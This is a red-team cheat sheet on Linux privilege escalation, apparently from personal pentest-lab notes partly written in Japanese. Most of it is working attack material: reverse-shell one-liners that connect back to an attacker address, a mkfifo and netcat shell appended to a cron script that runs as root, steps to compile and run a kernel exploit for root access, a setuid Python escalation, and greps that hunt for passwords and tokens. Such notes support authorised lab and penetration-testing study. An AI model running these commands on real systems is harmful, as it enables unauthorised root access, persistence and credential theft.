---
title: Linux
parent: Privilege Escalation
grand_parent: Red Team
nav_order: 1
has_children: true
---
# Linux Privilege Escalation

---

## Purpose

Gain privileges on a Linux system.

Main objectives:
- Gain the privileges of other users
- Gain root privileges
- Execute commands as root
- Access restricted files
- Gather information for deployment to other systems
- Maintain persistence

---

## Attack Flow

Initial foothold → Enumeration → Identify misconfig or Vulnerability → Exploit → Root

---

## Quick Wins

- sudo -l
- SUID binaries
- writable files
- cron jobs
- credentials in env / config files

---


<details markdown="1">
<summary>TTY Shell</summary>

# TTY Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

```bash
import os; echo "os.system('/bin/bash')"
```

```bash
/bin/sh -i
```

```bash
bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1
```
- >& 標準出力(stdout) と 標準エラー(stderr) を同じ場所へリダイレクト。つまり：bash の出力全部→ TCP接続先へ送る
- 0>&1   0 = stdin 1 = stdout   つまり：stdin を stdout と同じ先へ向ける結果：攻撃者 → stdin
標的bash → stdout/stderr → 攻撃者 双方向通信になる。

```bash
perl -e 'exec "/bin/sh";'
```

## Suspend

```zsh
rlwrap -cAr nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.248.117] 48652
python3 -c 'import pty;pty.spawn("/bin/bash")'
[cmeeks@hetemit restjson_hetemit]$ whoami
whoami
cmeeks
[cmeeks@hetemit restjson_hetemit]$ 
zsh: suspended  rlwrap -cAr nc -lvnp 18000
```

## Restart

```zsh
stty raw -echo;fg
[1]  + continued  rlwrap -cAr nc -lvnp 18000
[cmeeks@hetemit restjson_hetemit]$ 
```

</details>

---

# System Enumeration
### basic info
```bash
whoami
```

```bash
id
```

```bash
hostname
```

```bash
uname -ar
```

### OS / version
```bash
cat /etc/os-release
```

## Kernel Exploits

```zsh
uname -ar
```

👉 Check:

- exploit-db / searchsploit


<details markdown="1">
<summary>ubuntu_16.04.04</summary>

### カーネルの脆弱性を悪用する
 
 #### ターゲットマシンの情報収集
```bash
cat /etc/issue
Ubuntu 16.04.4 LTS \n \l
```

```bash
#カーネルのバージョンとシステム アーキテクチャを検査
uname -r 
4.4.0-116-generic

arch
x86_64
```

#### 関連するexploitの調査
```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation   | linux/local/45010.c

cp /usr/share/exploitdb/exploits/linux/local/45010.c .

head 45010.c -n 20
gcc cve-2017-16995.c -o cve-2017-16995

mv 45010.c cve-2017-16995.c

#転送
scp cve-2017-16995.c joe@192.168.123.216:
```

#### ターゲット上でコンパイル
```bash
gcc cve-2017-16995.c -o cve-2017-16995

file cve-2017-16995

./cve-2017-16995

id
uid=0(root) gid=0(root) groups=0(root),1001(joe)
```

</details>

### users
```bash
cat /etc/passwd
```

```zsh
id
```

```zsh
ls /home
```

## Sudo Privileges
```bash
sudo -l
```

👉 Check:

NOPASSWD entries
allowed binaries

👉 Example:

```bash
ariana@pwned:~$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

```bash
ariana@pwned:~$ sudo -u selena /home/messenger.sh
```

👉 Example:
-  (root) /usr/bin/ftp

👉 Exploit:

[GTFOBins](https://gtfobins.github.io/) reference

---

## SUID Binaries

```zsh
find / -perm -4000 -type f 2>/dev/null
```

👉 Check:

unusual binaries
custom scripts

👉 Exploit:

[GTFOBins](https://gtfobins.github.io/) reference

---
## Capabilities

```bash
getcap -r / 2>/dev/null
```

👉 Check:

binaries with elevated capabilities


If Python

![](../../assets/images/Pasted%20image%2020260520055618.png)

![](../../assets/images/Pasted%20image%2020260520055728.png)

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

---

## Writable Files

```zsh
find / -writable -type f 2>/dev/null
```

👉 Check:

config files
scripts executed by root

---

# Cron Jobs

```zsh
cat /etc/crontab
```

```zsh
ls -la /etc/cron*
```

👉 Check:

<details markdown="1">
<summary>writable scripts</summary>

## 安全でないファイル権限のCronジョブの悪用

### ジョブの確認
```bash
grep "CRON" /var/log/syslog
Jul  7 09:15:15 debian-privesc CRON[1315]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

```bash
cat /home/joe/.scripts/user_backups.sh
```

user_backups.shの内容
```bash
#!/bin/bash
cp -rf /home/joe/ /var/backups/joe/
```

権限の確認
```bash
ls -lah /home/joe/.scripts/user_backups.sh
```

### スクリプトの改ざん
```bash
cd .scripts
```

```zsh
echo >> user_backups.sh
```

```zsh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.176 1234 >/tmp/f" >> user_backups.sh
```

`Kali`
```bash
nc -nlvp 1234

id
```

</details>

---

# PATH Hijacking

```zsh
echo $PATH
```

👉 Check:

writable directories in PATH

---

## Credentials Hunting

```zsh
grep -r "password" /home 2>/dev/null
```

```zsh
grep -r "pass" /etc 2>/dev/null
```

```bash
grep -rinE '(password|pword|username|user|pass|key|token|secret|admin|login|credentials|cred)'
```

👉 Common locations:

- config files
- scripts
- history files

---

# EnumTools


<details markdown="1">
<summary>linpeas</summary>

## linpeas

```bash
wget http://<IP>/linpeas.sh
```

```bash
chmod +x linpeas.sh
```

```bash
./linpeas.sh
```

- Common Issues
- Missing execution permissions
- Wrong PATH usage
- Misinterpreting SUID results

👉 Check: 
## Capabilities

</details>


<details markdown="1">
<summary>linux-smart-enumeration</summary>

## linux-smart-enumeration

### github


https://github.com/diego-treitos/linux-smart-enumeration

```zsh
python3 -m http.server 80
```

![](../../assets/images/Pasted%20image%2020260513224137.png)

```bash
chmod +x lse.sh 
```

- Enum for Level1
```zsh
./lse.sh -l1
```

</details>


<details markdown="1">
<summary>unix-privesc-check</summary>

## unix-privesc-check

`Kali`
```bash
cp /usr/bin/unix-privesc-check .
```

```zsh
python3 -m http.server 80
```

`Victim`
```bash
wget http://192.168.45.176/unix-privesc-check
```

```zsh
chmod 777 unix-privesc-check
```

the script supports "standard" and "detailed" mode.

```zsh
./unix-privesc-check standard > output.txt
```

```zsh
cat output.txt  | grep WARNING
```

Search the output below for the word 'WARNING'.  If you don't see it then WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd

</details>


<details markdown="1">
<summary>Metasploit Module</summary>

## Metasploit Module

multi/recon/local_exploit_suggester
Metasploitフレームワーク内の`multi/recon/local_exploit_suggester`モジュールは、ターゲットシステムでの特権昇格に利用できるローカルエクスプロイトを提案します。このモジュールは、ターゲットシステム上の既知の脆弱性を分析し、適切なエクスプロイトを推奨します。

</details>

---

## Example Vulnerabilities

### [Copy Fail](../99_attack_repo/101-150_lin-vuln/102_lin_copy-fail.md)

```zsh
python3 github/Tools/PrivEsc/Linux/copy-fail-CVE-2026-31431/copy_fail_exp.py
```

### [Dirty Flag](https://github.com/V4bel/dirtyfrag)


### [CVE-2024-1086](../99_attack_repo/101-150_lin-vuln/101_lin_cve-2024-1086.md)

